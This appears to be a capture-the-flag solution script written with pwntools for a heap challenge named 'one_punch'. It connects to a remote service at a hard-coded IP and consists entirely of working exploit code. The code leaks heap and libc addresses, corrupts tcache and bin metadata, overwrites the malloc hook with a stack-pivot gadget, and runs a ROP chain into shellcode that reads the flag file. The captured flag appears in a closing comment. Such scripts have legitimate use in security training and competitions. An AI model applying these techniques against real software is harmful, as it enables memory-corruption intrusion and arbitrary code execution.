from pwn import *

context.clear()
context.arch = "amd64"
context.os = "linux"
context.log_level = 'debug'
# p = process('./one_punch')
p = remote("52.198.120.1", 48763)

def debut(idx, n):
    p.recvuntil("> ")
    p.sendline("1")
    p.recvuntil(": ")
    p.sendline(str(idx))
    p.recvuntil(": ")
    p.send(n)

def rename(idx, n):
    p.recvuntil("> ")
    p.sendline("2")
    p.recvuntil(": ")
    p.sendline(str(idx))
    p.recvuntil(": ")
    p.send(n)

def show(idx):
    p.recvuntil("> ")
    p.sendline("3")
    p.recvuntil(": ")
    p.sendline(str(idx))

def retire(idx):
    p.recvuntil("> ")
    p.sendline("4")
    p.recvuntil(": ")
    p.sendline(str(idx))

for i in range(7):
    debut(0, "A"*0x400)
    retire(0)

show(0)
p.recvuntil(": ")
heapbase = u64(p.recvuntil("\n")[:-1].ljust(8, "\x00")) - 0xcb0 - 0xa00
log.info("%#x", heapbase)

for i in range(5):
    debut(0, "A"*0x210)
    retire(0)

debut(0, "A"*0x400)
debut(1, "B"*0x100)

retire(0)
show(0)
p.recvuntil(": ")
libcbase = u64(p.recvuntil("\n")[:-1].ljust(8, '\x00')) - 0x1e4ca0
log.info("%#x", libcbase)
debut(0, "A"*0x400)

debut(2, "A"*0x210)
z = ""
z += p64(heapbase + 0x2b50)
z += p64(libcbase + 0x1e4c90) # libcbase + 0x1e75a8 - 0x10)
z = z.ljust(0x1e0, "A")
z += p64(0)
z += p64(0x221)
z += p64(libcbase + 0x1e4eb0)
z += p64(heapbase + 0x2e80)
rename(2, z)

retire(0)
debut(2, "A"*0x1e0)
debut(1, "A"*0x230)


z = ""
z += p64(heapbase + 0x2b50)
z += p64(libcbase + 0x1e4c90) # libcbase + 0x1e75a8 - 0x10)
z = z.ljust(0x1e0, "A")
z += p64(0)
z += p64(0x221)
z += p64(libcbase + 0x1e4eb0)
z += p64(heapbase + 0x2960)
rename(0, z)

debut(2, "A"*0x217)

p.recvuntil("> ")
p.sendline(str(50056))
pause()
# p.send(p64(libcbase + 0x1e4c20) + p64(0))
p.send(p64(heapbase))

debut(0, "\x08"*0x220)
rename(0, "\x08"*0x140 + p64(libcbase + 0x1e4c30)) # malloc hook
rename(2, "./flag\x00")

p.recvuntil("> ")
p.sendline(str(50056))
pause()
# p.send(p64(libcbase + 0x1e4c20) + p64(0))

# 0x000000000010ccee: add rsp, 0x68; ret;
z = libcbase + 0x10ccee
p.send(p64(z)) # system -- overwrite over free hook

buf = heapbase + 0x2b60
z = ""
z += "/home/ctf/flag"
z = z.ljust(0x20, "\x00")
z += asm("""
        mov rdi, 0x%x
        xor rsi, rsi
        mov eax, 2
        syscall

        cmp rax, 0
        jl fail

        mov rdi, rax
        mov rsi, 0x%x
        mov rdx, 0x40
        xor rax, rax
        syscall

        xor rdi, rdi
        inc rdi
        mov rsi, 0x%x
        mov rdx, 0x40
        xor rax, rax
        inc rax
        syscall

    loop:
        jmp loop
    fail:
        xor rdi, rdi
        inc rdi
        mov rsi, 0x%x
        mov rdx, 0x40
        xor rax, rax
        inc rax
        syscall
        """ % (buf,heapbase,heapbase,buf))
rename(2, z)

# 0x0000000000026542: pop rdi; ret;
pop_rdi_ret = libcbase + 0x26542
# 0x0000000000026f9e: pop rsi; ret;
pop_rsi_ret = libcbase + 0x26f9e
# 0x000000000012bda6: pop rdx; ret;
pop_rdx_ret = libcbase + 0x12bda6
# 0x0000000000047cf8: pop rax; ret;
pop_rax_ret = libcbase + 0x47cf8
# 0x00000000000cf6c5: syscall; ret;
syscall_ret = libcbase + 0xcf6c5

z = ""
z += "A"*0x20
z += p64(pop_rdi_ret)
z += p64(heapbase)
z += p64(pop_rsi_ret)
z += p64(0x21000)
z += p64(pop_rdx_ret)
z += p64(0x7)
z += p64(pop_rax_ret)
z += p64(0xa)
z += p64(syscall_ret)
z += p64(buf + 0x20)
z = z.ljust(0x100, "A")

debut(1, z)

p.interactive()

# flag: hitcon{y0u_f0rg0t_h0u23_0f_10r3_0r_4fra1d_1ar93_b1n_4tt4ck}
